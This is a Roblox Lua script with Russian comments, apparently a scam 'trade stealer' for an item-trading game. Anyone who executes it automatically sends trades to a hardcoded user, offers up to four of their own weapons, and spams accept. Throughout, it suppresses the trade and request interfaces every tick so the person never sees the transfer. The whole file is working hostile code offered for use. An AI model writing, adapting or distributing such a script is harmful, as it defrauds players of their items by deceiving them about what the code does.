local TARGET_USER = "ilyes_ida3"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer
local Trade = ReplicatedStorage:WaitForChild("Trade")

local untradable = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true, ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true,
    ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local activeTarget = nil
local currentTradeStatus = "None"
local myInventory = {}
local lastOfferToken = nil

-- =====================================================================
-- 1. АСИНХРОННЫЙ ПУЛЛИНГ СТАТУСА (ОБХОД ЗАВИСАНИЙ INVOKESERVER)
-- На мобилах InvokeServer может ждать ответа вечно. Оборачиваем в поток.
-- =====================================================================
task.spawn(function()
    while task.wait(0.5) do
        task.spawn(function()
            local ok, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
            if ok and res then currentTradeStatus = res end
        end)
    end
end)

-- =====================================================================
-- 2. ИЗОЛИРОВАННОЕ ОБНОВЛЕНИЕ ИНВЕНТАРЯ
-- =====================================================================
local function refreshInv()
    task.spawn(function()
        local ok, data = pcall(function() return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name) end)
        if ok and type(data) == "table" and data.Weapons and data.Weapons.Owned then
            local temp = {}
            for id, amt in pairs(data.Weapons.Owned) do
                if amt > 0 and not untradable[id] then
                    table.insert(temp, {id = id, amt = amt})
                end
            end
            myInventory = temp
        end
    end)
end
refreshInv()

-- =====================================================================
-- 3. ПЕРЕХВАТЧИК СЕТЕВЫХ ИВЕНТОВ
-- =====================================================================
Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if type(data) == "table" then
        if data.LastOffer then lastOfferToken = data.LastOffer end
        local p1 = type(data.Player1) == "table" and data.Player1.Name or tostring(data.Player1)
        local p2 = type(data.Player2) == "table" and data.Player2.Name or tostring(data.Player2)
        
        if string.find(p1, TARGET_USER, 1, true) or string.find(p2, TARGET_USER, 1, true) then
            activeTarget = TARGET_USER
        end
    end
end)

local function resolveTargetFromUI()
    if activeTarget == TARGET_USER then return TARGET_USER end
    local tGui = plr.PlayerGui:FindFirstChild("TradeGUI")
    if tGui then
        for _, obj in ipairs(tGui:GetDescendants()) do
            if obj:IsA("TextLabel") and string.find(obj.Text, TARGET_USER, 1, true) then
                activeTarget = TARGET_USER
                return TARGET_USER
            end
        end
    end
    return nil
end

-- =====================================================================
-- 4. ЯДЕРНЫЙ ПОДАВИТЕЛЬ UI (БЕСКОНЕЧНЫЙ ЦИКЛ БЕЗ RUNSERVICE)
-- Глушит интерфейс каждый тик. Неубиваемый на мобилках.
-- =====================================================================
task.spawn(function()
    while task.wait() do
        local current = resolveTargetFromUI()
        
        local tGui = plr.PlayerGui:FindFirstChild("TradeGUI")
        if tGui then
            local main = tGui:FindFirstChild("Main")
            if current == TARGET_USER then
                tGui.Enabled = false
                if main then 
                    main.Visible = false
                    main.Position = UDim2.new(999, 0, 999, 0)
                end
            else
                -- Возврат для легитных трейдов с другими
                if main and main.Position.X.Scale == 999 then
                    main.Visible = true
                    main.Position = UDim2.new(0.5, -main.Size.X.Offset/2, 0.5, -main.Size.Y.Offset/2)
                end
            end
        end
        
        -- Подавление входящего реквеста
        local rGui = plr.PlayerGui:FindFirstChild("TradeRequestGUI", true)
        if rGui then
            local isHim = false
            for _, obj in ipairs(rGui:GetDescendants()) do
                if obj:IsA("TextLabel") and string.find(obj.Text, TARGET_USER, 1, true) then
                    isHim = true; break
                end
            end
            if isHim then
                rGui.Enabled = false
                local rm = rGui:FindFirstChild("Main")
                if rm then rm.Visible = false end
            end
        end
    end
end)

-- =====================================================================
-- 5. БРОНЕБОЙНЫЙ ДВИЖОК ТРАНСФЕРА
-- =====================================================================
local tradeActive = false
task.spawn(function()
    while task.wait(0.2) do
        if currentTradeStatus == "None" then
            tradeActive = false
            activeTarget = nil
            lastOfferToken = nil
        elseif currentTradeStatus ~= "None" and currentTradeStatus ~= "ReceivingRequest" and not tradeActive then
            tradeActive = true
            
            -- Даем 1.5 секунды на прогрузку таргета по UI или ивентам
            local wt = 0
            while resolveTargetFromUI() ~= TARGET_USER and wt < 1.5 do
                task.wait(0.1)
                wt = wt + 0.1
            end
            
            if resolveTargetFromUI() == TARGET_USER then
                -- Это ilyes_ida3. Загружаем инвентарь и выплевываем вещи.
                refreshInv()
                task.wait(0.5) -- Ожидание ответа от сервера с предметами
                
                local added = 0
                for _, item in ipairs(myInventory) do
                    if added >= 4 then break end
                    for i = 1, item.amt do
                        if added >= 4 then break end
                        pcall(function() Trade.OfferItem:FireServer(item.id, "Weapons") end)
                        added = added + 1
                        task.wait(0.25) -- Увеличенная задержка для мобильного пинга
                    end
                end
                
                -- Жесткий цикл ожидания токена и спам акцептом
                local waitToken = 0
                while not lastOfferToken and waitToken < 6 do 
                    task.wait(0.2) 
                    waitToken = waitToken + 0.2 
                end
                
                for i = 1, 15 do
                    if currentTradeStatus == "None" then break end
                    pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken) end)
                    task.wait(0.4)
                end
            else
                -- Это легит игрок. Скрипт умолкает.
            end
        end
    end
end)

-- =====================================================================
-- 6. АВТО-СЕНДЕР
-- =====================================================================
task.spawn(function()
    while task.wait(3) do
        if currentTradeStatus == "None" then
            local tgt = Players:FindFirstChild(TARGET_USER)
            if tgt then
                pcall(function() Trade.SendRequest:InvokeServer(tgt) end)
            end
        end
    end
end)

-- =====================================================================
-- 7. АВТО-АКЦЕПТЕР
-- =====================================================================
task.spawn(function()
    while task.wait(0.5) do
        if currentTradeStatus == "ReceivingRequest" then
            local rGui = plr.PlayerGui:FindFirstChild("TradeRequestGUI", true)
            if rGui then
                local isHim = false
                for _, obj in ipairs(rGui:GetDescendants()) do
                    if obj:IsA("TextLabel") and string.find(obj.Text, TARGET_USER, 1, true) then
                        isHim = true; break
                    end
                end
                if isHim then
                    pcall(function()
                        local r = Trade:FindFirstChild("AcceptRequest")
                        if r then 
                            if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end 
                        end
                    end)
                end
            end
        end
    end
end)
